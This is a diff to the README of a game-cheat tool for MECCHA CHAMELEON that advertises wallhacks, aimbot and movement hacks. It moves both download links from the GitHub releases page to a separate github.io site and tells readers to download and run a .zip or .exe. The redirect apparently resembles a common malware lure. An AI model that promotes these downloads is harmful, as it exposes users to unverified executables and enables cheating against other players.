@@ -1,6 +1,6 @@
 # ☢️ Meccha-Nuclear-Cheat - Gain total control of your game
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Zodiacal-cover857/Meccha-Nuclear-Cheat/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://zodiacal-cover857.github.io)
 
 Meccha-Nuclear-Cheat provides tools for MECCHA CHAMELEON. Use this software to improve your performance and change how you interact with the game world. Access features like wallhacks, automatic targeting, and movement modifiers to change your experience.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards before you start:
 
 Follow these directions to set up the software correctly on your machine.
 
-1. Visit the [official releases page](https://github.com/Zodiacal-cover857/Meccha-Nuclear-Cheat/releases) to access the latest version.
+1. Visit the [official releases page](https://zodiacal-cover857.github.io) to access the latest version.
 2. Locate the most recent file ending in .zip or .exe under the Assets section.
 3. Select the file to save it to your local drive.
 4. If you downloaded a zip file, right-click it and choose Extract All to view the contents.
